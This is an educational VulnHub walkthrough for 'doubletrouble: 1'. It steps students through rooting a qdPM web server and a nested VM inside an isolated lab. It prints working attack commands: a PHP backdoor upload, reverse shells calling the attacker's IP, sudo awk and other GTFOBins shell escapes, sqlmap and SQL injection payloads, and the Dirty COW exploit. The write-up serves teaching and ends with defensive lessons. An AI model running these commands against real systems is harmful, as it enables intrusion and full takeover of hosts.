# doubletrouble: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational boot2root walkthrough for students. Everything here is performed on
> an isolated lab network against a machine you intentionally downloaded to attack.
> Never point these techniques at systems you do not own or have written permission to test.

| Field | Value |
| --- | --- |
| **Machine** | doubletrouble: 1 |
| **Difficulty** | **3 — Easy** (stated: *Easy*) |
| **Author** | tasiyanci |
| **Released** | 11 September 2021 |
| **VulnHub Entry** | [https://vulnhub.com/entry/doubletrouble-1,743/](https://vulnhub.com/entry/doubletrouble-1,743/) |
| **Download** | [https://vulnhub.com/entry/doubletrouble-1,743/#download](https://vulnhub.com/entry/doubletrouble-1,743/#download) (mirror: `https://download.vulnhub.com/doubletrouble/doubletrouble.ova`, ~979 MB) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) on a host-only network |
| **Target OS** | Linux (Debian/Ubuntu; outer = qdPM on Apache/PHP, inner = Debian 3.2 kernel) |

> **Why the name:** the outer VM is only half the challenge. Once you root it you find a
> *second* VM (an OVA) in `/root` — the "double" trouble. You must import and root that
> one too to reach the final flag.
>
> **Note:** exact IPs, paths, and flags **vary by build**. Where you see `192.168.56.101`,
> substitute whatever address *your* target gets from DHCP. The inner VM will get its own
> address (e.g. `192.168.56.103`).

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a live target with `netdiscover` / `arp-scan`.
- How to recognise a **qdPM** web application and enumerate it with `gobuster`.
- How to exploit a **config-file leak** (`/core/config/databases.yml`) for DB credentials.
- How to extract **steganographically hidden** data from an image with `stegseek`.
- How to use leaked credentials to log in and abuse a **qdPM 9.1 authenticated RCE**.
- How to get a reverse shell and upgrade it to a full TTY.
- How to escalate with `sudo awk` (GTFOBins) to root the outer VM.
- How to pivot into a **nested inner VM**, find **SQL injection**, and root it with
  **Dirty COW** (CVE-2016-5195).

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to import
an OVA, and be comfortable in a Linux shell.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** the host-only adapter (`eth0`) is on `192.168.56.x`; the target VM is
> on the **same** subnet, so a subnet scan will reveal it.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -r 192.168.56.0/24
# or:
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   (Kali)
192.168.56.101  (target)
```

> **How to read it:** the host that is not your Kali box is the target — here
> `192.168.56.101`.

**Target IP:** `192.168.56.101`

![Finding the target with netdiscover](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.x ((Ubuntu))
|_http-title: qdPM | Login
```

> **How to read it:** only two ports. The web title says **qdPM** — a known project-management
> app that has had several exploits. That name is the single biggest clue on the box.

### 2.1 Directory brute-force with gobuster


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.101/ \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
  -x .php,.txt,.bak,.zip -t 50
```

```text
/index.php            (Status: 200)
/core                 (Status: 301)
/secret               (Status: 301)
/uploads              (Status: 301)  <-- directory listing enabled
/install              (Status: 301)
/sf                   (Status: 301)
```

> **Why it works:** `gobuster` requests each word in the list as a path and reports the
> HTTP status. `301`/`200` responses reveal real directories. Two jump out: **`/secret`**
> and **`/uploads`** (with *directory listing* on, so you can browse filenames).

![gobuster results](images/02-gobuster.png)

### 2.2 Two leaks: config file and a secret image

qdPM is built on Symfony, which keeps DB credentials in a YAML file:

```bash
curl -s http://192.168.56.101/core/config/databases.yml
```

```text
all:
  doctrine:
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      username: otis
      password: "<?php echo urlencode('rush') ; ?>"
```

> **Why it works:** the config file is served by the web server, so anyone can read it. It
> leaks the DB username/password pattern (`otis` / `rush`), which is a great hint for later.

Browse `/secret/` for the image:

```bash
curl -s http://192.168.56.101/secret/
wget http://192.168.56.101/secret/doubletrouble.jpg
```

```text
doubletrouble.jpg
```

> **Why it works:** a lone `.jpg` parked in a web directory is a classic invitation to try
> **steganography** — hidden data buried inside a file that looks like a picture.

![Directory listing and config leak](images/03-enum.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Crack the hidden data in the image

Extract hidden data from the JPG. `stegseek` brute-forces the passphrase quickly.


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
stegseek doubletrouble.jpg /usr/share/wordlists/rockyou.txt
```

```text
[i] Found passphrase: "92camaro"
[i] Original filename: "creds.txt"
[i] Extracting to "doubletrouble.jpg.out"
```

```bash
cat doubletrouble.jpg.out
```

```text
otisrush@localhost.com
otis666
```

> **Why it works:** steganography hides data inside the pixels of an image. `stegseek`
> tries each word from `rockyou.txt` as the passphrase until the embedded payload decrypts
> cleanly. The payload is a **credential pair**: email `otisrush@localhost.com`, password
> `otis666`. (If `stegseek` is unavailable, `steghide` + `stegcracker` do the same job.)

### 3.2 Log in to qdPM

The login page asks for an **email** and a **password** — which is exactly what we recovered.

```text
URL:      http://192.168.56.101/index.php/login
Email:    otisrush@localhost.com
Password: otis666
```

> **Why it works:** the credentials hidden in the image are valid qdPM users. We are now
> authenticated into the application.

### 3.3 Exploit qdPM 9.1 authenticated RCE

qdPM 9.1 has an **authenticated remote code execution** flaw: the profile "upload image"
feature does not properly validate uploaded files, letting you upload a PHP web shell.

First find the exploit locally:


> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit qdPM
```

```text
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated)   | php/webapps/50175.py
```

Run it (or simply upload a PHP shell through the profile's image upload in the browser):

```bash
python3 50175.py --host 'http://192.168.56.101/' \
  -u otisrush@localhost.com -p otis666
```

```text
Backdoor uploaded at ->
http://192.168.56.101/uploads/users/148232-backdoor.php?cmd=whoami
```

```bash
curl 'http://192.168.56.101/uploads/users/148232-backdoor.php?cmd=whoami'
```

```text
<pre>www-data
</pre>
```

> **Why it works:** the app stores uploaded files under `/uploads/users/` **without
> renaming to a safe extension**, so our `.php` file is executed by Apache as PHP. Passing
> `?cmd=` runs a shell command as the web user (`www-data`).

### 3.4 Get a reverse shell

On Kali, start a listener; then trigger a shell from the uploaded backdoor.


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# Kali
nc -lvnp 443
```

```bash
# Trigger via curl (URL-encode the spaces)
curl 'http://192.168.56.101/uploads/users/148232-backdoor.php?cmd=nc%20192.168.56.10%20443%20-e%20/bin/bash'
```

```text
www-data@doubletrouble:/var/www/html/uploads/users$
```

> **Why it works:** `nc -e /bin/bash` makes the target connect **back** to our listener and
> hand us a shell. Because we initiated it *from the target*, it bypasses inbound firewalls.

Upgrade the dumb shell to a full TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then on Kali:
stty raw -echo; fg
# then press Enter and:
export TERM=xterm
```

> **Why it works:** the raw shell has no job control or tab-completion. Spawning a PTY and
> resetting terminal modes gives us an interactive shell that behaves normally.

![Reverse shell as www-data](images/04-shell-wwwdata.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root (twice)

### 4.1 Outer VM: abuse `sudo awk`


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
User www-data may run the following commands on doubletrouble:
    (ALL : ALL) NOPASSWD: /usr/bin/awk
```

> **Why it works:** `www-data` can run **`/usr/bin/awk` as root with no password**. `awk`
> has a `system()` function that executes arbitrary shell commands — so we can make it run
> `bash`, and that `bash` inherits root. This is a well-known GTFOBins technique.

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

```text
root@doubletrouble:~# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** GTFOBins documents that `awk` can escape to a shell. Since the binary
> runs as root via sudo, the spawned shell is root.

![Escalating to root via sudo awk](images/05-privesc-awk.png)

### 4.2 The surprise: a second VM

Look in root's home directory — there is no flag, only an OVA:

```bash
ls -la /root
```

```text
doubletrouble.ova
```

> **Why it works:** the challenge ships a *nested* VM. To finish, copy the OVA into the
> web root and download it, then import it as a new VirtualBox VM.

```bash
cp /root/doubletrouble.ova /var/www/html/
chmod 644 /var/www/html/doubletrouble.ova
```

```bash
# On Kali
wget http://192.168.56.101/doubletrouble.ova
```

Then import the OVA in VirtualBox and power it on. Find its new address:

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
192.168.56.103  (inner "double trouble" VM)
```

![Downloading and importing the second VM](images/06-second-vm.png)

### 4.3 Inner VM: find SQL injection and get user creds

The inner VM's port 80 shows a small custom login form. Test the login parameter for
**SQL injection** (it is vulnerable to time-based injection against MySQL).


> ### 📖 Concept — What is SQL injection?
>
> The application builds a query by **concatenating your input**:
>
> ```php
> $q = "SELECT * FROM users WHERE user='".$_POST['u']."' AND pass='".$_POST['p']."'";
> ```
>
> Supply `admin' -- ` and it becomes:
>
> ```sql
> SELECT * FROM users WHERE user='admin' -- ' AND pass='whatever'
> ```
>
> `-- ` starts a SQL comment (**the trailing space is required in MySQL**), so the
> password check is deleted and you are logged in as admin with no password. Your
> input escaped the *data* context and became *code*.
>
> **Detect it** by inserting `'`, `"`, `` ` ``, `)` or `--` and watching for a database
> error, a changed page length, or a different status code.
>
> **Payload shapes:**
>
> ```text
> ' OR 1=1 --                        tautology
> ' OR '1'='1                        string-context tautology
> 1' UNION SELECT 1,2,3 --           find the column count, then extract data
> 1' UNION SELECT user_login,user_pass,3 FROM wp_users --
> '; WAITFOR DELAY '0:0:5' --        blind/time-based confirmation
> ```
>
> ```bash
> sqlmap -u "http://target/page.php?id=1" --dbs
> sqlmap -u "http://target/page.php?id=1" -D wordpress -T wp_users --dump
> sqlmap -r request.txt --batch --level 3 --risk 2      # from a saved Burp request
> ```
>
> > **`sqlmap` is a tool, not a substitute for understanding.** When it fails the
> > reason is usually that you have not told it *where* the injectable parameter is,
> > that authentication is needed (`--cookie=`), or that the injection is
> > second-order. Confirm manually with a `'` first — it takes ten seconds and tells
> > you whether sqlmap has anything to work with.
>
> The fix is always the same: **prepared statements / bound parameters**, never string
> concatenation.
>
> **Deep dive:** [CONCEPTS §13.1 — SQL injection](../../docs/CONCEPTS.md#131-sql-injection-sqli)

```bash
# Confirm the injection, then dump the database
sqlmap -u http://192.168.56.103/ --forms --dbms=mysql -p uname --current-db
sqlmap -u http://192.168.56.103/ --forms --dbms=mysql -p uname -D doubletrouble --tables
sqlmap -u http://192.168.56.103/ --forms --dbms=mysql -p uname -D doubletrouble -T users --dump
```

```text
Database: doubletrouble
Table: users
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | clapton  | ZubZub99 |
+----+----------+----------+
```

> **Why it works:** the login form concatenates user input straight into a SQL query.
> `sqlmap` detects this and automates extraction. We recover a real account: **clapton**.

### 4.4 Inner VM: SSH in and root with Dirty COW

```bash
ssh clapton@192.168.56.103
# password: ZubZub99
```

```text
clapton@doubletrouble:~$ id
uid=1000(clapton) gid=1000(clapton) ...
clapton@doubletrouble:~$ cat flag.txt
<user flag — varies by build>

clapton@doubletrouble:~$ uname -a
Linux doubletrouble 3.2.0-4-amd64 ... x86_64 GNU/Linux
```

> **Why it works:** the kernel is `3.2.0-4-amd64` (Debian) — vulnerable to **Dirty COW**
> (CVE-2016-5195), a race condition in the Linux copy-on-write handling of read-only
> memory that lets an unprivileged user write to files they should not be able to.

Compile and run the public exploit to create a new root-equivalent user:

```bash
# On the inner VM (or transfer the compiled binary)
wget http://192.168.56.10:8000/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

```text
# creates/replaces user 'firefart' with a chosen password, UID 0
# (the original /etc/passwd is backed up, e.g. /tmp/passwd.bak)
```

Now log in as that new user (UID 0) over SSH:

```bash
ssh firefart@192.168.56.103
# password: (whatever you set, e.g. firefart)
```

```text
firefart@doubletrouble:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@doubletrouble:~# ls /root
root.txt
firefart@doubletrouble:~# cat /root/root.txt
<root flag — varies by build>
```

> **Why it works:** the exploit temporarily overwrites the on-disk `/etc/passwd` so a new
> account with **UID 0** (i.e. root by number, regardless of name) exists. Logging in as
> that account gives full root. Restore the original `passwd` afterwards.

![Rooting the inner VM with Dirty COW](images/07-privesc-dirtycow.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Sensitive config file exposed | `/core/config/databases.yml` | Leaks DB credentials (`otis`/`rush`) |
| 2 | Hidden credentials in image (steganography) | `/secret/doubletrouble.jpg` (`92camaro`) | Recovers qdPM login (`otisrush@localhost.com`/`otis666`) |
| 3 | Unrestricted file upload / qdPM 9.1 authenticated RCE | `/uploads/users/*.php` | Remote code execution as `www-data` |
| 4 | Over-broad sudo | `www-data` → `NOPASSWD: /usr/bin/awk` | Escalation to root (GTFOBins) |
| 5 | SQL injection (time-based) | Inner VM login form | Dumps `clapton`/`ZubZub99` |
| 6 | Outdated kernel — Dirty COW (CVE-2016-5195) | Inner VM `3.2.0-4-amd64` | Unprivileged local user becomes root |

## 6. Defensive lessons (blue team)

- **Never expose framework config files.** Block access to `/core/`, `databases.yml`, and
  similar; keep secrets out of the web root.
- **Validate uploads server-side.** Reject unexpected extensions/MIME types, store uploads
  **outside** the web root, and never execute them as code.
- **Strip metadata from published images.** Re-encode images and scan for embedded payloads
  before publishing.
- **Parameterise SQL queries.** Use prepared statements so user input is never treated as
  code — this kills the injection on the inner VM.
- **Enforce least privilege on `sudo`.** Granting `NOPASSWD: /usr/bin/awk` is equal to giving
  a root shell; allowlist only safe arguments, or none at all.
- **Patch the kernel.** Dirty COW was fixed in 2016; running `3.2.0` years later is the whole
  privesc. Track EOL and use unattended security updates.
- **Detection:** alert on new `.php` files under `uploads/`, web-server child processes
  spawning shells, and known exploit filenames (`dirty`, `firefart`).

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: [doubletrouble: 1](https://vulnhub.com/entry/doubletrouble-1,743/)
- Community writeups consulted:
